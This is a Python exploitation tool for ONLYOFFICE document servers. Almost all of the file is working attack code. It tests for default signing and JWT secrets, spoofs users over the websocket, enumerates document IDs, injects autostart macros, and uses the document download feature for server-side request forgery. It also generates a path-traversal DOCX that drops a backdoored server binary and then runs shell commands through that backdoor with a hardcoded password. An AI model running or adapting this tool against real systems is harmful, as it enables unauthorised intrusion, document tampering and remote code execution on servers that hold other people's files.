#!/usr/bin/python3
# Exploit ONLYOFFICE implementations

import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib, datetime, traceback, jwt, shutil
from urllib.parse import urlparse, parse_qs
from zipfile import ZipFile

bdpassword = 'BcogExx7Hsmrti'

def process_fileparts( txt, docid=None ):
  txt = txt.replace(r'\"','"')[3:-2]
  m = re.search(r'([0-9]\+)\/Editor\.bin\/',txt)
  if m:
    print('DL:',m.group(1))
  data = json.loads(txt)
  print(data)
  tmpdir = tempfile.mkdtemp()
  for fn, url in data['data']['data'].items():
    dest = os.path.join( tmpdir, fn )
    d = os.path.dirname(dest)
    if not os.path.isdir(d):
      print('Creating ' + d)
      os.makedirs(d)
    print('Downloading ' + fn )
    r = requests.get( url, stream=True )
    print('Writing to '+dest,end='')
    with open( dest, 'wb' ) as f:
      for chunk in r:
        print('.',end='')
        f.write(chunk)
    print(' done')
  print( 'finished downloads')
  infile = os.path.join(tmpdir,'Editor.bin')
  if docid:
    outfile = str(docid)+'.docx'
  else:
    outfile = 'document.docx'
  print('Attempting to convert ',infile,'to',outfile)
  subprocess.check_output([os.path.dirname(__file__)+'/bin/x2t',infile,outfile])
  # subprocess.check_output(['open',outfile])

# See if a signed URL is signed by a default secret
def test_secret_string( signedurl, secret='verysecretstring' ):
  h = get_url_signature( signedurl, secret )
  u = urlparse( signedurl )
  q = parse_qs( u.query )
  if q['md5'][0] == h:
    print('Cypto secret is:', secret)

def md5( s ):
  m = hashlib.md5()
  m.update(s.encode('utf8'))
  h = base64.b64encode(m.digest()).decode('utf8').strip().replace('+','-').replace('/','_').replace('=','')
  return h

def get_url_signature( url, secret ):
  u = urlparse( url )
  q = parse_qs( u.query )
  s = q['expires'][0] + u.path.replace('/ds-vpath','') + secret
  return md5( s )

def sign_url( url, secret ):
  h = get_url_signature( url, secret )
  return url + '&md5=' + h

# Generate a docx dropper for a backdoored docservice bin
def generate_backdoor( docservicepath, password, version, traversedepth ):
  # Create build dir
  scriptdir = os.path.dirname(__file__)
  builddir = scriptdir + '/build'
  dsbin = scriptdir + '/bin/docservice'
  if not os.path.isdir( builddir ):
    shutil.makedirs( builddir )

  # Clone server repo

  # Switch to correct version tag
  # Insert backdoor code into JS
  # npm install all dependencies
  # pkg to `docservice`
  
  # Copy blank docx
  docsdir = scriptdir + '/docs'
  docfile = docsdir + '/backdoor.docx'
  shutil.copy( docsdir + '/blank.docx', docfile )

  # Open as zip
  zipObj = ZipFile( docfile,'a')
  root = '../' * traversedepth
  path = root + docservicepath
  with open( dsbin, 'rb' ) as f:
    
    # Write path traversal + docservice
    zipObj.writestr( path , f.read() )
  zipObj.close()

  return

class WsClient():

  autodownload=False
  testsecret=True
  output=True
  usejwt = False

  def __init__( self, url, docid, platform, username='admin', output=True, disconnect=False, usejwt=False ):
    self.usejwt = usejwt
    self.jwtsecret = 'secret'
    self.output = output
    self.disconnect = disconnect
    self.docid = docid
    self.platform = platform
    self.url = url
    self.username = username
    self.license = None
    self.connect()

  def connect( self ):
    self.url = re.sub(r'^http(s)?','ws\g<1>',self.url)

    path = '/doc/'+self.docid+'/c/1/a/websocket'
  
    if self.platform == 'nextcloud':
      path = '/ds-vpath' + path
    
    self.url = self.url + path

    if self.output: print( 'Connecting to', self.url )
    self.ws = websocket.create_connection( self.url )

    # Spawn socket listener
    self.spawn_listener()

  def close( self ):
    if self.output: print('Closing connection')
    self.send({'type':'close'})
    self.ws.close()
    self.stop_listener()

  def stop_listener( self ):
    if self.output: print('Stopping listener')
    self.listener.kill.set()

  def send( self, message ):
    if not self.ws.connected: return
    if type( message ) != str:
      if self.usejwt: message['jwtOpen'] = self.create_jwt()
      # JSON containing JSON string
      message = json.dumps([json.dumps(message)])
      print( message )
    self.ws.send( message )

  def recv( self ):
    try:
      return self.ws.recv()
    except:
      return '' 
      

  def recv_listen( self ):
    while self.ws.connected:
      msg = self.recv()
      if msg == '': 
        if self.output: print('Exiting listen loop')
        return
      if msg.startswith('a["{'):
        try:
          data = json.loads(json.loads(msg[1:])[0])
          if self.output: print("RECV:", data['type'] )
          if data['type'] == 'message':
            for m in data['messages']:
              if self.output: 
                print(datetime.datetime.utcfromtimestamp(round(m['time']/1000)).strftime('[%Y-%m-%d %H:%M:%S] ') + m['username'] + ': ' + m['message'])
          
          elif data['type'] == 'license':
            self.license = data['license']

          elif data['type'] == 'documentOpen':
            if data["data"]["status"] == 'err':
              self.close()
              return
            print('FOUND:',self.docid)
            if self.testsecret:
              if 'data' in data['data']:
                for secret in ['secret','SECRET','verysecretstring']:
                  if 'Editor.bin' in data['data']['data']:
                    test_secret_string( data['data']['data']['Editor.bin'], secret )
                  else:
                    test_secret_string( data['data']['data'], secret )
            if self.disconnect:
              self.close()
          
          elif data['type'] in ('auth','connectState'):
            if self.output:
              if 'participants' in data and len(data['participants']) > 0:
                print('\nParticipants:') 
                for p in data['participants']:
                  print(' - '+p['username'])

              if 'messages' in data and len(data['messages']) > 0:
                print('\nMessages:')
                for m in data['messages']:
                  print(datetime.datetime.utcfromtimestamp(round(m['time']/1000)).strftime('[%Y-%m-%d %H:%M:%S] ') + m['username'] + ': ' + m['message'])

          elif data['type'] == 'rpc':
            if self.output: print(data)
          else:
            if self.output: print('')
        except Exception as e:
          if self.output: print("ERR:", e)
      elif msg.startswith('c['):
        data = json.loads(msg[1:])
        print(data[1])
        if 'jwt must be provided' in data[1]:
          self.usejwt = True

      else:
        if self.output: print("RECV:", msg)
      if self.autodownload and 'Editor.bin' in msg:
        process_fileparts(msg, self.docid)
        if self.disconnect:
          self.close()

  def spawn_listener( self ):
    self.listener = threading.Thread( target=self.recv_listen )
    self.listener.kill = threading.Event()
    self.listener.start()

  def send_chat_message( self, msg ):
    data = {
      'type': 'message',
      'message': msg 
    }
    self.send( data )

  def get_messages( self ):
    self.send({"type":"getMessages"})

  def chat( self ):
    print('\nChat mode\n=========\nType messages, ENTER to send\n')
    self.get_messages()
    while self.ws.connected:
      msg = input()
      self.send_chat_message(msg.strip())
    print('CHAT: Disconnected')

  def rename( self, name ):
    self.send(
    {
      "type":"rpc",
      "data": {
        'type': 'wopi_RenameFile',
        'name': name
      }
    })

  def shell( self, password ):
    while True:
      cmd = input()
      self.shell_exec( cmd, password )

  def shell_exec( self, cmd, password ):
    self.send(
      {
        'type':'shell',
        'data': {
          'password': password,
          'command': cmd
        }
      }
    )

  def create_jwt( self ):
    
    body = {"width":"100%","height":"100%","type":"desktop","documentType":"word","token":"","document":{"title":"new.docx","url":"https://dsdetest.tk/example/download?fileName=new.docx&useraddress=86.158.182.233","fileType":"docx","key":"86.158.182.233https___dsdetest.tk_example_files_86.158.182.233_new.docx1634914864602","info":{"owner":"Me","uploaded":"Tue Oct 26 2021","favorite":None},"permissions":{"comment":True,"copy":True,"download":True,"edit":True,"print":True,"fillForms":True,"modifyFilter":True,"modifyContentControl":True,"review":True,"reviewGroups":None,"commentGroups":{}}},"editorConfig":{"actionLink":None,"mode":"edit","lang":"en","callbackUrl":"https://dsdetest.tk/example/traY2s_filename=new.docx&useraddress=86.158.182.233","createUrl":"https://dsdetest.tk/example/editor?fileExt=docx&userid=uid-1&type=undefined&lang=en","templates":[{"image":"","title":"Blank","url":"https://dsdetest.tk/example/editor?fileExt=docx&userid=uid-1&type=undefined&lang=en"},{"image":"https://dsdetest.tk/example/images/file_docx.svg","title":"With sample content","url":"https://dsdetest.tk/example/editor?fileExt=docx&userid=uid-1&type=undefined&lang=en&sample=True"}],"user":{"group":"","id":"uid-1","name":"John Smith"},"embedded":{"saveUrl":"https://dsdetest.tk/example/files/86.158.182.233/new.docx","embedUrl":"https://dsdetest.tk/example/files/86.158.182.233/new.docx","shareUrl":"https://dsdetest.tk/example/files/86.158.182.233/new.docx","toolbarDocked":"top"},"customization":{"about":True,"chat":True,"comments":True,"feedback":True,"forcesave":False,"goback":{"url":"https://dsdetest.tk/example/"},"submitForm":True},"fileChoiceUrl":"","plugins":{"pluginsData":[]}},"iat":1635281563,"exp":1635281863}
    # body = {"document":{"key":self.docid,"permissions":{"comment":True,"copy":True,"download":True,"edit":True,"print":True,"fillForms":True,"modifyFilter":True,"modifyContentControl":True,"review":True,"reviewGroups":None,"commentGroups":{}}},"editorConfig":{"user":{"id":"uid-1","name":self.username,"index":1},"ds_view":False,"ds_isCloseCoAuthoring":False,"ds_denyChangeName":True},"iat":time.time(),"exp":time.time() + 1000}
    jwtstr = jwt.encode( body, self.jwtsecret, algorithm='HS256' ).decode('utf8')
    return jwtstr


  def auth( self, docurl='' ):
    data = {
      'type': 'auth',
      'docid': self.docid,
      'token': 'a',
      'user': {
        'id':'a',
        'username': self.username,
        'firstname':'',
        'lastname':'',
        'indexUser':-1
      },
      'editorType':0,
      'lastOtherSaveTime':-1,
      'block':[],
      'sessionId':None,
      'sessionTimeConnect':None,
      'sessionTimeIdle':0,
      'documentFormatSave':65,
      'view':False,
      'isCloseCoAuthoring':False,
      'openCmd':{
        'c':'open',
        'id':self.docid,
        'userid':'a',
        'format':'docx',
        'url':docurl,
        'title':'document.docx',
        'lcid':2057,
        'nobase64':False
      },
      'lang':None,
      'mode':None,
      'permissions':{'edit':True},
      'IsAnonymousUser':False
    }
    self.send( data )
    

  def save_changes( self, changes ):
    message = {
      'type':'saveChanges',
      'startSaveChanges':True,
      'endSaveChanges':True,
      'isCoAuthoring':False,
      'isExcel':False,
      'changes':json.dumps(changes),
      'deleteIndex': 1,
      'excelAdditionalInfo':json.dumps({
        'lm':'admin',
        'SYg':'admin',
        'wTg':'14;BgAAADgAMQA0AAAAAAA='
      }),
      'unlock':False,
      'releaseLocks':False
    }
    self.send( message )

  def inject_macro( self, macrotxt ):
    payload = json.dumps({
      "macrosArray":[{
        "name":"Macro 1",
        "value":macrotxt,
        "guid": str(uuid.uuid4()).replace('-',''),
        "autostart": True
      }],
      "current":0
    })
    data = b'\x1e\x00\x00\x00\x5f\x00\x6d\x00\x61\x00\x63\x00\x72\x00\x6f\x00\x73\x00\x47\x00\x6c\x00\x6f\x00\x62\x00\x61\x00\x6c\x00\x49\x00\x64\x00\x01\x00\x00\x00\x00\x00\x00\x00' +(2 * len(payload)).to_bytes(2,byteorder='little')+b'\x00\x00' + bytes(payload, 'utf16')[2:] + b'\x00\x00\x00\x00'
    changes = [str(len(data))+';'+base64.b64encode(data).decode('utf8')]
    self.save_changes( changes )


def main():
  parser = argparse.ArgumentParser(description="ONLYOFFICE exploitation tool")
  parser.add_argument('-u', '--url', help='Base URL of the site running ONLYOFFICE')
  parser.add_argument('-d', '--docid', help='id of the document')
  parser.add_argument('-U', '--username', default='admin', help='Username to spoof')
  parser.add_argument('-j', '--usejwt', default=False, action='store_true', help='Send a JWT with requests')
  parser.add_argument('-D', '--docurl', help='Document URL to download to OO cache for the current docid (SSRF, unix: pipes supported)', default='')
  parser.add_argument('-p', '--platform', default='nextcloud', help='What the underlying platform is')
  subparsers = parser.add_subparsers(dest='command')

  # Download
  dlparse = subparsers.add_parser('dl', help="Download a document")

  # Inject macro
  injparse = subparsers.add_parser('macro', help="Inject a JavaScript macro into a document")
  injparse.add_argument('script', help='Javascript file to inject into document')

  # Enumerate cached doc ids
  enumparse = subparsers.add_parser('enum', help="Attempt to enumerate valid document ids")
  enumparse.add_argument('docids', help='text file containing doc ids to test')

  # Chat
  chatparse = subparsers.add_parser('chat', help="Chat with other people connected to the same document")

  # Rename
  rnparse = subparsers.add_parser('rename', help="Invoke the rename function on the hosting DMS")
  rnparse.add_argument("filename",help='Filename to rename to')

  # Run shell command (backdoored DocServer only)
  shellparse = subparsers.add_parser('shell', help="Execute a shell command (requires document server to be backdoored)")
  shellparse.add_argument('--password',help='Password to allow backdoored doc server to exec shell commands. Change the default if you ever use this in a real engagement for goodness sake', default=bdpassword)
  # shellparse.add_argument('cmd', default='', help='Shell command to exec')
 
  # Run an SQL command
  shellparse = subparsers.add_parser('sql', help="Execute an SQL command (requires document server to be backdoored)")
  shellparse.add_argument('--password',help='Password to allow backdoored doc server to exec sql commands. Change the default if you ever use this in a real engagement for goodness sake', default=bdpassword)
  shellparse.add_argument('cmd',help='SQL command to exec')

  # Generate DOCX which drops a backdoored version of document server
  bdparse = subparsers.add_parser('backdoor', help='Generate a DOCX which drops a backdoored version of document server')
  bdparse.add_argument('--docservice', help='Full path to docservice bin on target server', default='/var/www/onlyoffice/documentserver/server/DocService/docservice')
  bdparse.add_argument('--password',help='Password to protect backdoor from any old random from using it', default=bdpassword)
  bdparse.add_argument('--version',help='Which ONLYOFFICE version to build for')
  bdparse.add_argument('--depth', type=int, help='Depth of path traversal chars (../) required to reach root of filesystem', default=10)

  args = parser.parse_args()

  if not args.command or not args.url or ( args.command == 'enum' and not args.docids ):
    parser.print_help()
    sys.exit(2)

  # Document enumeration
  if args.command == 'enum':
    print('Attempting document id enumeration')
    threads = []
    start = time.time()
    with open( args.docids, 'r' ) as f:
      count = 1
      for line in f:
        clear = False
        docid = line.strip()
        while not clear:
          try:
            rate = round(count/(time.time() - start))
            print( count, docid, '  ', threading.active_count(), '  ', str(rate)+'/s', end='       \r' )
            client = WsClient( args.url, docid, args.platform, output=False, disconnect=True, usejwt=args.usejwt)
            client.auth()
            count+=1
            clear = True
            while threading.active_count() > 10: # Free license limits it to 20, warnings start filling up logs at 14.
              # print('Waiting for active threads to calm down:', threading.active_count(),end='               \r')
              time.sleep(0.1)
          except Exception as e:
            print( count )
            print( e )
            # print(traceback.format_exc())
    
    sys.exit(0)

  if not args.docid:
    args.docid = md5(str(time.time()))
    print('NO DOCID SPECIFIED - using "' + args.docid + '"')

  client = WsClient( args.url, args.docid, args.platform, username=args.username, usejwt=args.usejwt )

  # Macro injection
  if args.command == 'macro':
    with open(args.script, 'r') as f:
      client.auth()
      time.sleep(1)
      print('Injecting',args.script)
      client.inject_macro(f.read())

  # Poison document cache with external URL
  # SSRF
  if args.command == 'dl':
    client.autodownload = True
    client.disconnect = True
    client.auth( args.docurl )

  # Chat
  if args.command == 'chat':
    client.auth()
    client.chat()

  # Rename
  if args.command == 'rename':
    client.auth()
    client.rename( args.filename )

  # Run shell command
  if args.command == 'shell':
    client.auth()
    client.shell( args.password )

  # Run sql command
  if args.command == 'sql':
    client.auth()
    client.sql_exec( args.cmd, args.password )

  # Create backdoor file
  if args.command == 'backdoor':
    if args.version:
      version = args.version
    else:
      version = client.license['buildVersion'] + '.' + client.license['buildNumber']
    generate_backdoor( args.docservice, args.password, version, args.depth )

if __name__ == '__main__':
  main()
